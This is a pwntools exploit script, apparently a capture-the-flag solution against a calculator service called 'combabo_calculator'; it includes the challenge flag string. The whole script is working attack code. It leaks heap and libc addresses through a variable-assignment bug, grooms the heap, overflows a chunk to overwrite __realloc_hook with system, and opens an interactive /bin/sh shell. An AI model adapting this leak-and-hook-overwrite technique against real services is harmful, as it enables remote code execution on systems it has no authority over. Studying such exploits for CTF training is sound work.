from pwn import *

context.log_level = "info"

FLAG = "flag is {Lesson 1:What you must learn about computer system is that some of them can be bent. Others can be broken.}"

libc_leak_offset = 0x1Af700
hook_id_offset = 0x3E0
fake_token_offset = 0x568

libc_path = "/home/combabo_calculator/combabo.so.6"

p = remote("0.0.0.0", 9030)
libc = ELF(libc_path)


def send_command(s):
    p.recvuntil(">>> ")
    p.sendline(s)


def str_to_var(var_name, size, fill='a'):
    val = fill * size
    command = var_name + '="' + val + '"'
    send_command(command)


def bytes_to_var(var_name, val):
    command = var_name.encode('ascii') + b'="' + val + b'"'
    send_command(command)


def assign_to_var(var_name, val):
    command = var_name + '=' + str(val)
    send_command(command)


def put_breakpoint():
    send_command('(1)')


def init_a():
    str_to_var('a', size=0)
    assign_to_var('a', val=-1)


def init_b(init_size):
    str_to_var('b', size=init_size)


def leak_heap(alloc_size):
    assign_to_var('b', val=-2)
    assign_to_var('b', val='a')
    str_to_var('c', size=0)
    assign_to_var('c', val=alloc_size)
    assign_to_var('b', val='c')
    send_command('b')

    leaked = p.recv(4)
    return unpack(leaked, bits=32)


def groom_heap_for_leak(amount, size):
    for i in range(amount):
        str_to_var('r' + str(i), size=0)
    for i in range(amount):
        str_to_var('r' + str(i), size=size)


# Heap Info Leak
init_a()
init_b(init_size=86)
libc_leak = leak_heap(alloc_size=64)
groom_heap_for_leak(amount=3, size=22)
heap_leak = leak_heap(alloc_size=32)

libc.address = libc_leak - libc_leak_offset

print("libc_leak:", hex(libc_leak), "heap_leak:", hex(heap_leak))
print("libc_base:", hex(libc.address))

realloc_hook = pack(libc.symbols["__realloc_hook"], bits=32)
system = pack(libc.symbols["system"], bits=32)

print("realloc_hook:", hex(unpack(realloc_hook, bits=32)), "system:", hex(unpack(system, bits=32)))

hook_id_addr = pack(heap_leak + hook_id_offset, bits=32)
fake_token_addr = pack(heap_leak + fake_token_offset, bits=32)

print("hook_id_addr:", hex(unpack(hook_id_addr, bits=32)), "fake_token_addr:", hex(unpack(fake_token_addr, bits=32)))

# Heap Overflow
str_to_var("temp1", fill='a', size=50)
str_to_var("hook", fill='b', size=50)
str_to_var("overflow", fill='c', size=50)
bytes_to_var("win", b'/bin/sh\x00')

fake_token = realloc_hook + realloc_hook + pack(0x11111111, bits=32) + pack(0x1111110c, bits=32)
padding = b'B' * 0x20
new_symbol = b'CCCC' + pack(0x19191919, bits=32) + hook_id_addr + fake_token_addr
payload = fake_token + padding + new_symbol

bytes_to_var("payload", payload)
assign_to_var("payload", 0)
assign_to_var("overflow", "payload")

bytes_to_var("hook", system)
put_breakpoint()
assign_to_var("win", "temp1")

p.interactive()

